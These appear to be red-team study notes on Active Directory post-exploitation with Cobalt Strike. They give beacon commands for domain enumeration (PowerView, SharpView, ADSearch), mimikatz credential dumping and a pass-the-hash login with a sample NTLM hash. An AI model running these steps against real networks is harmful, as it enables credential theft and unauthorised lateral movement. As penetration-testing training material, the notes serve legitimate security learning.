# How to know and become someone else >:)

After elevating access on a Workstation, we should do some domain recon to see where we may be able to leverage them.
We could enumerate from the current domain as a standard domain user initially with
- **PowerView**
```
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
```
- **SharpView**
```
beacon> execute-assembly C:\Tools\SharpView\SharpView\bin\Release\SharpView.exe Get-Domain
```
- **ADSearch**
```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "objectCategory=user"
```

We would know from our domain recon who is a **local administrator** on multiple computers via his **membership** and get credential materials like NTLM hash, AES256 hash and a Kerberos TGT.

### Pass the Hash
The **Pass the Hash** technique is done using the NTLM hash. That can be retrieved with mimikatz 
```
beacon> mimikatz !sekurlsa::logonpasswords
```
and then perform the action
```
beacon> pth DEV\jking 59fc0f884922b4ce376051134c71e22c
```
